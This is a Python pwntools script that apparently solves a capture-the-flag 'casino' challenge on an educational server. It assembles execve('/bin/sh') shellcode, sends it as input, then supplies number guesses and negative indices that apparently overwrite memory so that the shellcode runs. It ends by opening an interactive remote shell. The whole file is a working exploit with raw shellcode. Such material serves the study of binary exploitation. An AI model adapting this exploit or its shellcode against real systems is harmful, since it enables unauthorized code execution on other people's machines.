from pwn import *

context(arch='amd64')

#r = process('./casino')
#pause()

host = 'edu-ctf.csie.org'
port = 10172

r = remote(host, port)

sh = asm(
        '''
        mov    rax, 0x68732f6e69622f 
        push   rax  
        mov    rdi, rsp 
        xor    rsi, rsi 
        xor    rdx, rdx 
        mov    rax, 0x3b 
        syscall
        '''
        )

sh = asm(shellcraft.sh())
#print(sh)
#pause()
#sh = b'jhH\xb8/bin///sPj;XH\x89\xe71\xf6\x99\x0f\x05'
#sh = b'jhH\xb8/bin///sPj;XH\x89\x71\xf6\x99\x0f\x05'
#r.sendafter(': ', sh)
r.sendafter(': ', sh)
r.sendafter(': ', b'84908534')
r.sendlineafter(': ', b'12')
r.sendlineafter(': ', b'12')
r.sendlineafter(': ', b'12')
r.sendlineafter(': ', b'12')
r.sendlineafter(': ', b'12')
r.sendlineafter(': ', b'12')
r.sendlineafter(': ', b'1')
r.sendlineafter(': ', b'-42')
r.sendafter(': ', b'0')

r.sendlineafter(': ', b'1')
r.sendlineafter(': ', b'83')
r.sendlineafter(': ', b'54')
r.sendlineafter(': ', b'89')
r.sendlineafter(': ', b'44')
r.sendlineafter(': ', b'9')
r.sendlineafter(': ', b'1')
r.sendlineafter(': ', b'-43')
r.sendafter(': ', b'6299888')

r.interactive()
